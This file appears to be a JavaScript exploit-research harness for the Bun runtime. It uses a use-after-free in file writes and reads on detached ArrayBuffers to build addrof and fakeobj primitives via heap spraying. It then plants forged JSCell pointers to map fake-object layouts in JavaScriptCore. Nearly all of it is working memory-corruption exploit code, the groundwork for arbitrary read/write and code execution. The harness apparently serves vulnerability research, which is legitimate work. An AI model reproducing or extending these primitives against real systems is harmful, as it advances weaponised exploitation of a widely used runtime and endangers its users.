// Path-A fake-cell layout mapper. Builds on:
//   lab/harnesses/13-arb-rw-probes/object-bridge-addrof-probe.js
//   lab/harnesses/13-arb-rw-probes/object-bridge-fakeobj-probe.js
//
// Goal: for an attacker-chosen JS object T, leak addrof(T) and then plant
// addrof(T)+DELTA as a fake JSCell pointer. Observe whether JSC's read of
// the fake cell at offset +5 (the cellState byte in JSCell::typeInfoBlob)
// survives, and what comes back to JS, or what address the SEGV lands at.
//
// This isolates one experiment per process invocation so a SEGV in one
// experiment does not poison the next. Sweep TEMPLATE/DELTA via shell.
//
// Env:
//   TEMPLATE       — one of {plain, withProps, doubleArray, objectArray,
//                            arrayBuffer, uint8Array, float64Array,
//                            biguint64Array, dataView, regexp, function}
//   DELTA          — signed integer, default 0 (e.g. -32, 0, 8, 16, 24)
//
// Stable BufferSource-UAF parameters reused from object-bridge-*-probe.js.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const size = Number(process.env.BUF_SIZE || 8192);
const slots = Number(process.env.SLOTS || 1024);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const elementOffset = Number(process.env.ELEMENT_OFFSET || 144);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || 1 << 20);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const template = process.env.TEMPLATE || "plain";
const delta = BigInt(Number(process.env.DELTA || 0));
const sentinel = { kind: "sentinel" };

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-uaf-fclm-${label}-${process.pid}-${Math.random().toString(36).slice(2, 8)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo failed: ${mk.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(f) {
  for (const fd of [f.writeFd, f.fillFd, f.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(f.path); } catch {}
}

function isAgain(e) { return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK"; }

function fillFifo(f) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(f.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("fifo fill failed");
  return filled;
}

async function readExact(f, n, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, n)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < n) {
    try {
      const got = fs.readSync(f.readFd, scratch, 0, Math.min(scratch.length, n - total), null);
      if (got > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, got)));
        total += got;
        continue;
      }
    } catch (e) {
      if (!isAgain(e)) throw e;
    }
    if (Date.now() >= deadline) throw new Error(`timed out ${label}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}

function readU64LE(buf, off) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(buf[off + i]);
  return v;
}

function writeU64LE(v) {
  const out = Buffer.alloc(8);
  let x = v;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(x & 0xffn);
    x >>= 8n;
  }
  return out;
}

// Build a target object whose layout we want to learn.
function makeTemplate(kind) {
  switch (kind) {
    case "plain":          return {};
    case "withProps":      return { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6 };
    case "doubleArray":    return [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
    case "objectArray":    return [{}, {}, {}, {}, {}, {}, {}, {}];
    case "arrayBuffer":    return new ArrayBuffer(64);
    case "uint8Array":     return new Uint8Array(64);
    case "float64Array":   return new Float64Array(8);
    case "biguint64Array": return new BigUint64Array(8);
    case "dataView":       return new DataView(new ArrayBuffer(64));
    case "regexp":         return /abc/;
    case "function":       return function () { return 42; };
    default: throw new Error(`unknown TEMPLATE=${kind}`);
  }
}

// addrof(target): same recipe as object-bridge-addrof-probe.js.
async function addrof(target) {
  const fifo = makeFifo("leak");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(size);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise((r) => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bw) => r({ err, bw }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < sprayCount; i++) {
      const arr = new Array(slots);
      for (let j = 0; j < slots; j++) arr[j] = target;
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, size, "leak");
    await done;
    return readU64LE(leaked, elementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

// plantBits(bits): same recipe as object-bridge-fakeobj-probe.js.
async function plantBits(bits) {
  const path = join(tmpdir(), `bun-uaf-fclm-write-${process.pid}-${Math.random().toString(36).slice(2, 8)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo: ${mk.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  const retained = [];
  try {
    const ab = new ArrayBuffer(size);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise((r) => {
      fs.read(fd, target, elementOffset, 8, null, (err, bytesRead) => r({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < sprayCount; i++) {
      const arr = new Array(slots);
      for (let j = 0; j < slots; j++) arr[j] = sentinel;
      retained.push(arr);
    }
    gcNow();
    fs.writeSync(fd, writeU64LE(bits), 0, 8);
    await done;
    return retained.slice();
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findPlanted(retained) {
  for (let i = 0; i < retained.length; i++) {
    const arr = retained[i];
    if (arr[0] !== sentinel) return { arrayIndex: i, value: arr[0] };
  }
  return null;
}

function describeValue(v) {
  if (v === sentinel) return { kind: "sentinel" };
  if (v === null) return { kind: "null" };
  if (v === undefined) return { kind: "undefined" };
  if (typeof v !== "object" && typeof v !== "function") return { kind: typeof v, repr: String(v) };
  return {
    kind: typeof v,
    constructor: v?.constructor?.name || "?",
    isArray: Array.isArray(v),
    isTypedArray: v instanceof Object && (v.buffer instanceof ArrayBuffer),
  };
}

const target = makeTemplate(template);
const targetAddr = await addrof(target);
const plantedBits = (targetAddr + delta) & 0xFFFFFFFFFFFFFFFFn;

let outcome = { phase: "planted", template, delta: Number(delta), targetAddr: `0x${targetAddr.toString(16).padStart(16, "0")}`, plantedBits: `0x${plantedBits.toString(16).padStart(16, "0")}` };
console.error(JSON.stringify(outcome));

const retained = await plantBits(plantedBits);
const found = findPlanted(retained);

let readBack = null;
let identityProbe = null;
if (found) {
  // Touch the planted slot via two distinct safe operations and report the
  // result. Each touch potentially performs a JSCell-level read that may
  // SEGV if the fake cell is invalid; if it survives, we learn JSC accepted
  // the bytes at the planted address as a valid cell.
  try {
    readBack = describeValue(found.value);
  } catch (e) {
    readBack = { kind: "throw-on-read", message: String(e?.message || e) };
  }
  try {
    identityProbe = found.value === target;
  } catch (e) {
    identityProbe = `throw: ${String(e?.message || e)}`;
  }
}

console.log(JSON.stringify({
  phase: "result",
  template,
  delta: Number(delta),
  targetAddr: `0x${targetAddr.toString(16).padStart(16, "0")}`,
  plantedBits: `0x${plantedBits.toString(16).padStart(16, "0")}`,
  found: found ? { arrayIndex: found.arrayIndex } : null,
  readBack,
  identityProbe,
}));
process.exitCode = found ? 86 : 1;
